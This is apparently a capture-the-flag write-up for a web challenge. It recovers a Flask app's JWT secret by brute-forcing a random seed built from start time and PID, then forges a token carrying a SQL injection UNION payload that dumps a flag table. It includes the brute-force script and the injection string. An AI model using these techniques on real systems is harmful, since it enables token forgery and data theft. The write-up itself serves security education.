# Chall Description 

You’ve been informed that a website might be serving as a front for a large criminal network. Part of their revenue supposedly comes from selling cookies that can make you float like an airship… A rather tempting proposition. Their slogan, it seems, is: "Always wondered how to get the coolest and the highest quality products in your region ? Search no more, this new website allows you to do so !"

Attachment : app.py

# Steps

Reading the source code we can find interessing parts :

```python
# I saw in the official _randommodule.c in which both time and pid are used to seed the random generator
# So that must be a good idea, right ? :) Just gonna do it simpler here, but should be as safe.

up = math.floor(time.time())
random.seed(up + os.getpid())
```
```python
app = Flask(__name__)
app.config['SECRET_KEY'] = "".join(random.choice(string.printable) for _ in range(32))
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////app/data/site.db'
app.config['JWT_SECRET_KEY'] = "".join(random.choice(string.printable) for _ in range(32))
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['JWT_COOKIE_CSRF_PROTECT'] = False 
```

The random is seed on the time where the server is start and the PID wich is very weak since we have access on the time using `/healthz` wich allow us to know since when the server has been started :

```json
{"status":"OK","uptime":355601.6438162327}
```

Knowing this and the facts that the price are generate based on the same random, we can bruteforce it :

First we calcul the timestamp of server start : `now - uptime = 4194304`

and we bruteforce the PID : 

```python
for pid in range(4194304):  
    random.seed(baseTimestamp + pid)  
    useless = "".join(random.choice(string.printable) for _ in range(32))  
    KEY = "".join(random.choice(string.printable) for _ in range(32))  
    a = random.randrange(10, 100)  
    b = random.randrange(10, 100)  
    c = random.randrange(10, 100)  
    if a == 43 and b == 58 and c == 40:
        print(baseTimestamp, pid)  
        print(KEY)  
        print(str(base64.b64encode(bytes(KEY, "utf-8"))))  
```

With the key we can craft ours own JW Tokens. Now looking in the code we see that their is a input vulnerable to a SQLi and using the JWT as input (since favorite product is stored in there):

```python
favorite_product = db.session.execute(text("SELECT * FROM product WHERE id = " + str(favorite_product_id))).fetchone()
```

We insert this query in our JWT :

```SQL
42 UNION SELECT flag, flag, flag, flag, flag, flag FROM flag
```

And going to `/favorite_product_info` we get our flag : `HACKDAY{Th4t_s_S0m3_g000000000000d_qu4lity!}`






